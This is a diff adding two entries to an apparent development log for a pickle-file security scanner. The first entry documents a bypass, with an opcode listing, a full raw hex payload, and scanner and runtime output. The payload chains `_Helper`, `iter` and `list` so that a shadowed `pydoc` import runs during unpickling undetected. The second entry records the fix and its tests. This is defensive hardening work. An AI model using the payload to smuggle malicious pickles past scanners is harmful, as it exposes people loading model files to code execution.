@@ -13506,3 +13506,219 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3736 passed, 1022 skipped, 21 warnings in 54.18s`.
+
+## Turn 229 - Bypass via `iter(callable, sentinel)` consumed by `list`
+
+Found a scanner-clean RCE-capable bypass in Python's callable-iterator
+protocol. The payload constructs a `_sitebuiltins._Helper` instance, wraps it
+with `builtins.iter(helper, "stop")`, then passes the resulting call iterator
+to `builtins.list`. Creating the call iterator is lazy, but `list(iterator)`
+consumes it immediately. That calls `helper()`, entering `_Helper.__call__()`,
+which performs a function-body `import pydoc`. A shadow `pydoc.py` at the front
+of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL _sitebuiltins _Helper
+EMPTY_TUPLE
+REDUCE              # construct _Helper()
+MEMOIZE
+POP
+STACK_GLOBAL builtins iter
+BINGET 0
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # create call_iterator(helper, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL builtins list
+BINGET 1
+TUPLE1
+REDUCE              # list(call_iterator) calls helper()
+STOP
+```
+
+Raw payload:
+
+```text
+80048c0d5f736974656275696c74696e738c075f48656c70657293295294308c086275696c74696e738c04697465729368008c0473746f70865294308c086275696c74696e738c046c69737493680185522e
+```
+
+Scanner proof:
+
+```text
+payload_len 82
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'import_reference': '_sitebuiltins._Helper', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'iter',
+   'import_reference': 'builtins.iter', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'list',
+   'import_reference': 'builtins.list', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'opcode_position': 28, 'positional_arg_count': 0},
+  {'module': 'builtins', 'name': 'iter',
+   'opcode_position': 57, 'positional_arg_count': 2},
+  {'module': 'builtins', 'name': 'list',
+   'opcode_position': 80, 'positional_arg_count': 1},
+)
+actual_dangerous ()
+hyp_dangerous (CallGraphFinding(module='_sitebuiltins',
+  name='_Helper.__call__', sink='builtins.__import__'),)
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result []
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and returned `"stop"` from
+`help()`, so the call iterator stopped after one invocation and `list(...)`
+returned `[]`.
+
+Why it bypasses:
+
+- Native policy does not mark `_sitebuiltins._Helper`, `builtins.iter`, or
+  `builtins.list` as dangerous.
+- Turn 224-style constructed-callable modeling only fires when the constructed
+  object itself is the reducer callable. Here `_Helper` is an argument to
+  `iter()`, then it is invoked later by the call-iterator protocol.
+- Turn 228's `builtins.help` alias does not apply because the payload never
+  imports or invokes `builtins.help`; it constructs the same implementation
+  class directly and hides the call behind `iter(callable, sentinel)`.
+- The scanner records `builtins.list` consuming an opaque constructed iterator,
+  but does not preserve that the iterator's source callable was the `_Helper`
+  instance.
+- The payload contains no `__call__`, `help`, or `pydoc` literal.
+
+Likely source-level defense:
+
+- Extend the native stack model with a finite `CallIterator` value for
+  `builtins.iter(callable, sentinel)`. When the first argument is a tracked
+  constructed callable object, retain the underlying callable reference and
+  sentinel arity.
+- When an eager consumer such as `builtins.list`, `tuple`, `set`, `frozenset`,
+  `dict`, `collections.deque`, or another known iterator-draining reducer is
+  invoked on that `CallIterator`, emit an additional invocation for
+  `Class.__call__` with zero positional arguments.
+- Keep this evidence-based and stack-local: creating the call iterator alone is
+  lazy and should remain clean unless a later reducer proves consumption.
+- The Python call graph already catches `_sitebuiltins._Helper.__call__`
+  reaching `builtins.__import__` once native metadata names that method.
+
+Performance note:
+
+- Payload size is 82 bytes.
+- Warm scan median over 100 runs was `0.000095s` with max `0.000103s`.
+- A fix can be constant-time over the already-modeled reducer arguments and a
+  small eager-consumer table.
+
+## Turn 230 - Defense for consumed `iter(callable, sentinel)`
+
+Implemented the source-level block for Turn 229 in the native stack model. The
+scanner now preserves the callable hidden inside `builtins.iter(callable,
+sentinel)` as a lazy `CallIterator` stack value. Creating the call iterator
+alone remains clean. When a later reducer invokes an eager iterator consumer on
+that `CallIterator`, the native metadata emits an additional zero-argument
+invocation for the underlying callable target, allowing the existing Python
+call graph to catch `_sitebuiltins._Helper.__call__` reaching
+`builtins.__import__`.
+
+Fix details:
+
+- Added `StackValue::CallIterator { callable }` to retain the hidden callable
+  target produced by `iter(callable, sentinel)`.
+- `push_reducer_result()` now recognizes `builtins.iter` with exactly two
+  arguments and stores a lazy call iterator when the first argument is a tracked
+  global or constructed callable.
+- Constructed callable objects are normalized to `Class.__call__`; direct
+  globals remain direct callable invocations.
+- Eager consumers currently include `builtins.list`, `tuple`, `set`,
+  `frozenset`, `dict`, and `collections.deque`.
+- Consuming a tracked call iterator emits a synthetic zero-arg callable
+  invocation at the consumer opcode position.
+
+Regression coverage:
+
+- `test_scan_bytes_blocks_iter_callable_sentinel_consumption_rce` verifies that
+  a lazy `iter(_Helper(), "stop")` payload stays clean, while
+  `list(iter(_Helper(), "stop"))` is malicious and records
+  `_sitebuiltins._Helper.__call__` with zero positional arguments.
+- The test also executes the payload in a child interpreter with a shadow
+  `pydoc.py` returning the sentinel so the iterator stops after the first
+  hidden call.
+
+Post-fix proof:
+
+```text
+payload_len 82
+lazy_scan clean complete findings 0
+scan malicious complete findings 1
+callable_invocations (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'opcode_position': 28, 'positional_arg_count': 0},
+  {'module': 'builtins', 'name': 'iter',
+   'opcode_position': 57, 'positional_arg_count': 2},
+  {'module': 'builtins', 'name': 'list',
+   'opcode_position': 80, 'positional_arg_count': 1},
+  {'module': '_sitebuiltins', 'name': '_Helper.__call__',
+   'opcode_position': 80, 'positional_arg_count': 0},
+)
+call_graph [{'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__',
+                'builtins.__import__')}]
+dangerous (CallGraphFinding(module='_sitebuiltins',
+  name='_Helper.__call__', sink='builtins.__import__'),)
+runtime rc 0
+runtime stdout
+result []
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+warm_median 0.000130
+warm_max 0.000193
+```
+
+Performance note:
+
+- The new stack value is only created for `iter` reducer calls with two tracked
+  tuple arguments.
+- Eager consumption checks a small fixed table and the first already-modeled
+  reducer argument.
+- Warm scan median for the fixed 82-byte payload was `0.000130s` over 100
+  runs.
+
+Validation:
+
+- Rust formatting: `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused iterator regression: `1 passed in 0.34s`.
+- Focused import/call-graph regression file: `22 passed in 0.99s`.
+- Focused call-graph suite: `60 passed in 2.83s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.48s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3737 passed, 1022 skipped, 21 warnings in 54.47s`.
